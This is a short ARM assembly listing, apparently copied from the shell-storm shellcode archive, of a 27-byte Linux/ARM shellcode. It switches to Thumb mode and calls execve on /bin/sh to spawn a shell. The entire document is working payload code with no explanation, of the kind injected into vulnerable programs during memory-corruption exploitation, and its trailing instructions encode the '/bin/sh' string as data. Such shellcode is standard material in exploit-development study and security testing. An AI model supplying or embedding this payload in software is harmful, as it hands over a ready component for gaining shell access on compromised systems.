# Linux/ARM - execve("/bin/sh", [0], [0 vars]) - 27 bytes
# http://shell-storm.org/shellcode/files/shellcode-698.php
.section .text
.global _start
_start:
    add	  r3, pc, #1
    bx	  r3
    mov	  r0, pc
    adds	r0, #8
    subs	r1, r1, r1
    subs	r2, r2, r2
    movs	r7, #11
    svc	  1
    str	  r7, [r5, #32]
    ldr	  r1, [r5, #100]
    strb	r7, [r5, #12]
    lsls	r0, r5, #1
